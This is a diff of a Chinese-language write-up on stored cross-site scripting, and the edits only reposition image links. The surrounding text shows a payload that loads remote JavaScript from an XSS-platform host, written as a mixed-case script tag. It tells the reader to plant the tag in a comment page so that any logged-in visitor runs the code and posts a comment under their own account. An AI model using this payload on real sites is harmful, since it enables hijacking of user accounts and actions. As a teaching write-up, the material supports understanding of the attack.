@@ -59,14 +59,15 @@ xmlhttp1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 xmlhttp1.send(sendata); 
 ```
 
-![](01.png)
 
 xss平台生成远程JS文件链接地址：`<sCRiPt/SrC=//xss.fbisb.com/xxxx>`
+![](01.png)
 
-![](02.png)
 
 在评论页面处插入XSS代码：
 `<sCRiPt/SrC=//xss.fbisb.com/2h62></script>`
+
+![](02.png)
 
 任意用户登录页面会跨域调用恶意代码，发送评论`ssy是大帅哥`
 
